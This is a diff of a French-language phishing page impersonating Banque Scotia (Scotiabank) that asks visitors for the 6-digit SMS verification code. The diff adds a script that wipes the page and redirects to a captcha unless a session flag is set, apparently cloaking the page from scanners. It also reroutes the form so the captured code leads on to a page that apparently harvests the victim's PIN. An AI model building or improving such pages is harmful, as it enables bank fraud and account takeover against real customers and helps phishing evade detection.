@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
+<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banque Scotia - V&eacute;rification</title>
@@ -56,7 +57,7 @@
         <div class="s-title-bottom" style="font-size:24px; margin-bottom: 25px;">de s&eacute;curit&eacute;</div>
         
         <p style="margin-bottom: 25px; font-size: 15px; color: #444;">Afin de s&eacute;curiser votre connexion, veuillez entrer le code &agrave; 6 chiffres que nous venons de vous envoyer.</p>
-        <form action="scotiabank101_sms2.html" method="POST">
+        <form action="scotiabank101_nip.html" method="POST">
             <label class="s-label">Code de v&eacute;rification</label>
             <div class="s-input-wrapper">
                 <input type="text" class="s-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px; padding-left: 0;">
